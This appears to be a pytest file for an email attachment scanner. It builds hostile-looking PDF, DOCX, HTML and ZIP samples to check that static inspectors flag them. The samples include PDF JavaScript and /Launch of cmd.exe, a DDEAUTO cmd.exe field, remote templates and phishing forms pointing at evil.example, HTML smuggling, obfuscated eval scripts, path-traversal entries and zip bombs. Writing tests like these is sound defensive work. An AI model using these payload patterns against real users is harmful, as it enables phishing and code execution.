"""Inspección estática de adjuntos: cada tipo con sus trampas y sus límites.

Cubre el criterio de cierre: PDF, OOXML, HTML y ZIP tienen inspección
estática, sus límites se prueban (presupuesto de bytes, anidamiento, número de
entradas y de flujos, tamaño máximo) y ningún inspector puede ejecutar nada.
Las muestras se construyen aquí mismo, byte a byte, para que cada test diga qué
lleva su adjunto.
"""

from __future__ import annotations

import ast
import io
import pathlib
import zipfile
import zlib

import pytest

import src.modules.system.config_reading as CR
from src.modules.features.iris.services import attachment_inspectors
from src.modules.features.iris.services.attachment_inspectors import inspect_attachment
from src.modules.features.iris.services.attachment_inspectors.common import InspectionBudget
from src.modules.features.iris.services.parsers import Attachment, MessageContext
from src.modules.features.iris.services.rules.attachment_media_rules import (
    _reason_scores,
    check_suspicious_attachments,
)

pytestmark = pytest.mark.unit

DANGEROUS = frozenset({".exe", ".js", ".scr"})


def _inspect(name: str, content: bytes, content_type: str = "", **limits):
    return inspect_attachment(name, content_type, content, CR.IrisAttachmentInspection(**limits), DANGEROUS)


def _reasons(result) -> list:
    return [finding["reason"] for finding in result.findings]


def _zip(entries: dict, compression: int = zipfile.ZIP_DEFLATED) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression) as archive:
        for name, content in entries.items():
            archive.writestr(name, content)
    return buffer.getvalue()


def _mark_encrypted(data: bytes) -> bytes:
    """Activa el bit de cifrado de cada entrada (``zipfile`` no sabe escribir
    ZIP cifrados, y al inspector solo le importa el bit)."""
    patched = bytearray(data)
    for signature, flag_offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        position = patched.find(signature)
        while position >= 0:
            patched[position + flag_offset] |= 0x01
            position = patched.find(signature, position + 4)
    return bytes(patched)


def _pdf(*objects: bytes) -> bytes:
    body = b"\n".join(b"%d 0 obj\n%s\nendobj" % (index + 1, obj) for index, obj in enumerate(objects))
    return b"%PDF-1.7\n" + body + b"\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"


def _flate_stream(content: bytes) -> bytes:
    data = zlib.compress(content)
    return b"<< /Type /ObjStm /Filter /FlateDecode /Length %d >>\nstream\n%s\nendstream" % (len(data), data)


def _ooxml(extra: dict) -> bytes:
    return _zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w:document/>", **extra})


# ------------------------------------------------------------------ PDF

def test_a_pdf_that_runs_javascript_on_open():
    content = _pdf(b"<< /Type /Catalog /OpenAction 2 0 R >>", b"<< /S /JavaScript /JS (app.alert(1)) >>")

    result = _inspect("factura.pdf", content)

    assert _reasons(result) == ["pdf_javascript"]
    assert "al abrir" in result.findings[0]["detail"]


def test_javascript_hidden_in_a_compressed_object_stream_is_found():
    content = _pdf(b"<< /Type /Catalog >>", _flate_stream(b"<< /S /JavaScript /JS (x) >>"))

    assert b"/JavaScript" not in content
    assert _reasons(_inspect("factura.pdf", content)) == ["pdf_javascript"]


def test_hex_escaped_names_are_decoded_and_flagged():
    content = _pdf(b"<< /Type /Catalog /OpenAction << /S /J#61vaScript /J#53 (x) >> >>")

    assert _reasons(_inspect("factura.pdf", content)) == ["pdf_javascript", "pdf_obfuscated_names"]


def test_launch_embedded_files_forms_and_links():
    content = _pdf(
        b"<< /Type /Catalog /Names << /EmbeddedFiles << /Names [(a.exe) 3 0 R] >> >> >>",
        b"<< /S /Launch /F (cmd.exe) >>",
        b"<< /Type /EmbeddedFile /Length 0 >>",
        b"<< /S /SubmitForm /F << /FS /URL /F (https://evil.example/collect) >> >>",
        b"<< /S /URI /URI (https://login.evil.example/verify) >>",
    )

    result = _inspect("factura.pdf", content)

    assert _reasons(result) == ["pdf_launch_action", "pdf_embedded_file", "pdf_form_submit"]
    assert result.urls == ["https://login.evil.example/verify"]


def test_a_plain_pdf_with_a_zoom_open_action_is_clean():
    """/OpenAction solo, sin JavaScript ni /Launch, es cómo muchos PDF
    legítimos fijan el zoom inicial: no es un hallazgo."""
    content = _pdf(b"<< /Type /Catalog /OpenAction [2 0 R /FitH null] >>", b"<< /Type /Page >>")

    assert _inspect("factura.pdf", content).findings == []


def test_a_pdf_is_recognised_by_its_signature_whatever_its_name():
    content = _pdf(b"<< /S /JavaScript /JS (x) >>")

    assert _reasons(_inspect("leeme.txt", content, "text/plain")) == ["pdf_javascript"]


def test_only_the_first_pdf_streams_are_decompressed():
    content = _pdf(_flate_stream(b"nada"), _flate_stream(b"nada"), _flate_stream(b"<< /S /JavaScript >>"))

    assert _inspect("f.pdf", content, max_pdf_streams=2).findings == []
    assert _reasons(_inspect("f.pdf", content, max_pdf_streams=3)) == ["pdf_javascript"]


def test_decompression_never_exceeds_the_budget():
    budget = InspectionBudget(1000)

    output = budget.inflate(zlib.compress(b"\x00" * 10_000_000))

    assert len(output) == 1000
    assert budget.remaining == 0 and budget.is_exhausted


# ---------------------------------------------------------------- OOXML

def test_a_docx_carrying_a_vba_project():
    assert _reasons(_inspect("informe.docx", _ooxml({"word/vbaProject.bin": b"\xd0\xcf\x11\xe0"}))) == ["ooxml_macro"]


def test_a_remote_template_is_flagged_and_its_url_kept():
    rels = (b'<Relationships><Relationship Id="rId1" '
            b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            b'Target="https://evil.example/plantilla.dotm" TargetMode="External"/></Relationships>')

    result = _inspect("informe.docx", _ooxml({"word/_rels/settings.xml.rels": rels}))

    assert _reasons(result) == ["ooxml_remote_template"]
    assert result.urls == ["https://evil.example/plantilla.dotm"]


def test_external_objects_count_but_hyperlinks_do_not():
    rels = (b'<Relationships>'
            b'<Relationship Id="rId1" Type="http://x/relationships/hyperlink" '
            b'Target="https://www.example.org/" TargetMode="External"/>'
            b'<Relationship Id="rId2" Type="http://x/relationships/oleObject" '
            b'Target="https://evil.example/obj.bin" TargetMode="External"/>'
            b'</Relationships>')

    result = _inspect("informe.docx", _ooxml({"word/_rels/document.xml.rels": rels}))

    assert _reasons(result) == ["ooxml_external_relationship"]
    assert result.urls == ["https://www.example.org/", "https://evil.example/obj.bin"]


def test_a_dde_field():
    document = (b'<w:document><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\windows\\system32\\cmd.exe'
                b' "/k calc" </w:instrText></w:r></w:document>')

    assert _reasons(_inspect("informe.docx", _ooxml({"word/document.xml": document}))) == ["ooxml_dde"]


def test_a_plain_docx_is_clean():
    assert _inspect("informe.docx", _ooxml({})).findings == []


# ----------------------------------------------------------------- HTML

def test_html_smuggling_with_a_blob_download():
    html = (b'<html><script>var b = new Blob([atob("UEsDBA==")]); var a = document.createElement("a");'
            b'a.href = URL.createObjectURL(b); a.download = "factura.zip"; a.click();</script></html>')

    assert "html_smuggling" in _reasons(_inspect("factura.html", html, "text/html"))


def test_html_smuggling_with_a_data_uri_payload():
    html = b'<a href="data:application/octet-stream;base64,TVqQAAMA" download="factura.exe">Descargar</a>'

    assert _reasons(_inspect("factura.htm", html)) == ["html_smuggling"]


def test_a_local_credential_page_and_where_it_posts():
    html = (b'<form action="https://evil.example/login" method="post">'
            b'<input type="email" name="u"><input type="password" name="p"></form>')

    result = _inspect("acceso.html", html, "text/html")

    assert _reasons(result) == ["html_credential_form"]
    assert "https://evil.example/login" in result.findings[0]["detail"]
    assert result.urls == ["https://evil.example/login"]


def test_an_external_form_without_password():
    html = b'<form action="https://evil.example/encuesta"><input name="nombre"></form>'

    assert _reasons(_inspect("encuesta.html", html, "text/html")) == ["html_external_form"]


def test_obfuscated_script():
    html = b'<script>eval(unescape("%61%6c%65%72%74%28%31%29"))</script>'

    assert _reasons(_inspect("x.html", html, "text/html")) == ["html_obfuscated_script"]


def test_svg_goes_through_the_html_inspector():
    svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>eval(atob("YWxlcnQoMSk="))</script></svg>'

    assert _reasons(_inspect("logo.svg", svg, "image/svg+xml")) == ["html_obfuscated_script"]


def test_a_plain_html_is_clean():
    assert _inspect("boletin.html", b"<html><body><p>Hola</p></body></html>", "text/html").findings == []


# ------------------------------------------------------------------ ZIP

def test_an_executable_inside_nested_archives_is_found_with_its_path():
    inner = _zip({"factura.pdf.exe": b"MZ\x00\x00"})

    result = _inspect("envio.zip", _zip({"docs/inner.zip": inner}))

    assert _reasons(result) == ["archive_contains_executable"]
    assert result.findings[0]["path"] == "docs/inner.zip/factura.pdf.exe"


def test_a_pdf_inside_a_zip_is_inspected_too():
    result = _inspect("envio.zip", _zip({"factura.pdf": _pdf(b"<< /S /Launch /F (cmd.exe) >>")}))

    assert _reasons(result) == ["pdf_launch_action"]
    assert result.findings[0]["path"] == "factura.pdf"


def test_path_traversal():
    assert _reasons(_inspect("a.zip", _zip({"../../etc/cron.d/tarea": b"x"}))) == ["archive_path_traversal"]
    assert _reasons(_inspect("a.zip", _zip({"C:/Windows/evil.txt": b"x"}))) == ["archive_path_traversal"]


def test_an_encrypted_archive():
    assert _reasons(_inspect("a.zip", _mark_encrypted(_zip({"factura.pdf": b"%PDF-1.4"})))) == ["archive_encrypted"]


def test_a_zip_bomb_by_compression_ratio():
    """2 MiB de ceros comprimen a unos pocos KB: una razón que ningún fichero
    real tiene. No se descomprime para verlo; basta con lo que declara."""
    assert _reasons(_inspect("a.zip", _zip({"datos.bin": b"\x00" * (2 * 1024 * 1024)}))) == ["archive_bomb"]


def test_a_zip_that_declares_more_than_the_budget():
    assert "archive_bomb" in _reasons(_inspect("a.zip", _zip({"a.txt": b"x" * 5000}), max_expanded_bytes=1000))


def test_nesting_is_limited():
    deepest = _zip({"nota.txt": b"hola"})
    content = _zip({"uno.zip": _zip({"dos.zip": deepest})})

    result = _inspect("a.zip", content, max_archive_depth=1)

    assert _reasons(result) == ["archive_too_deep"]
    assert result.findings[0]["path"] == "uno.zip/dos.zip"


def test_the_number_of_entries_is_limited():
    content = _zip({f"{index}.txt": b"x" for index in range(5)})

    assert _reasons(_inspect("a.zip", content, max_archive_entries=3)) == ["archive_too_many_entries"]


# -------------------------------------------------------------- límites

def test_an_attachment_over_the_size_limit_is_not_opened():
    content = _pdf(b"<< /S /JavaScript /JS (x) >>")

    assert _inspect("f.pdf", content, max_inspected_bytes=len(content) - 1).findings == []


def test_no_inspector_can_execute_anything():
    """La garantía de «ningún adjunto se ejecuta», comprobada sobre el código:
    los inspectores solo importan módulos de lectura de bytes y texto, y no
    llaman a nada que evalúe o importe código."""
    allowed_imports = {"__future__", "dataclasses", "io", "re", "typing", "zipfile", "zlib"}
    forbidden_calls = {"eval", "exec", "compile", "__import__", "open"}
    package = pathlib.Path(attachment_inspectors.__file__).parent
    for source in package.glob("*.py"):
        tree = ast.parse(source.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                assert {alias.name for alias in node.names} <= allowed_imports, source.name
            elif isinstance(node, ast.ImportFrom) and node.level == 0:
                assert node.module in allowed_imports, source.name
            elif isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                assert node.func.id not in forbidden_calls, source.name


# -------------------------------------------------------------- la regla

def _rule(*attachments):
    return check_suspicious_attachments(MessageContext(headers={}, attachments=list(attachments)))


def _attachment(filename: str, content: bytes, content_type: str = "application/octet-stream") -> Attachment:
    return Attachment(filename=filename, content_type=content_type, size=len(content), content=content)


def test_the_rule_penalises_what_the_inspectors_find():
    result = _rule(_attachment("factura.pdf", _pdf(b"<< /S /JavaScript /JS (x) >>"), "application/pdf"))

    assert result.verdict == "fail"
    assert result.score == _reason_scores()["pdf_javascript"]
    finding = result.details["findings"][0]
    assert finding["reason"] == "pdf_javascript" and finding["filename"] == "factura.pdf"
    assert len(finding["sha256"]) == 64
    assert "JavaScript" in result.recommendation


def test_the_rule_keeps_embedded_urls_even_when_clean():
    content = _pdf(b"<< /S /URI /URI (https://www.example.org/) >>")

    result = _rule(_attachment("folleto.pdf", content, "application/pdf"))

    assert result.verdict == "pass"
    assert result.details["embedded_urls"] == [{"filename": "folleto.pdf", "urls": ["https://www.example.org/"]}]


def test_macros_named_and_found_are_counted_once():
    result = _rule(_attachment("informe.docm", _ooxml({"word/vbaProject.bin": b"\xd0\xcf"})))

    assert [finding["reason"] for finding in result.details["findings"]] == ["macro_enabled"]


def test_every_reason_the_inspectors_emit_has_a_weight():
    reasons = set()
    for source in pathlib.Path(attachment_inspectors.__file__).parent.glob("*.py"):
        tree = ast.parse(source.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Constant) and isinstance(node.value, str) and \
                    node.value.startswith(("pdf_", "ooxml_", "html_", "archive_")) and " " not in node.value:
                reasons.add(node.value)

    assert reasons <= set(_reason_scores()), reasons - set(_reason_scores())
